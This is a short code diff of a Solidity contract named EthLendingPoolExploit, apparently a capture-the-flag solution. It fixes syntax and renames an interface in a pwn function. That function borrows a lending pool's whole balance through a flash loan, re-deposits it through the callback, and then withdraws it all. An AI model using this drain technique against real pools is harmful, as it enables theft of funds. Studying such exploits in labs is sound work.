@@ -85,20 +85,15 @@ contract EthLendingPoolExploit {
 
     receive() external payable {}
 
-    function deposit() external payable () {
+    function deposit() external payable {
         pool.deposit{ value: msg.value }();
-    }
-
-    function _call(bytes memory data) private {
-        (bool executed, ) = target.call(data);
-        require(executed, "failed");
     }
 
     function pwn() external {
         uint bal = address(pool).balance;
         // 1. call flash loan
-        IBurnerWallet(pool).flashLoan(bal, address(this), abi.encodeWithSignature("deposit()"));
+        IEthLendingPool(pool).flashLoan(bal, address(this), abi.encodeWithSignature("deposit()"));
         // 3. withdraw
-        IBurnerWallet(pool).withdraw(bal);
+        IEthLendingPool(pool).withdraw(bal);
     }
 }   
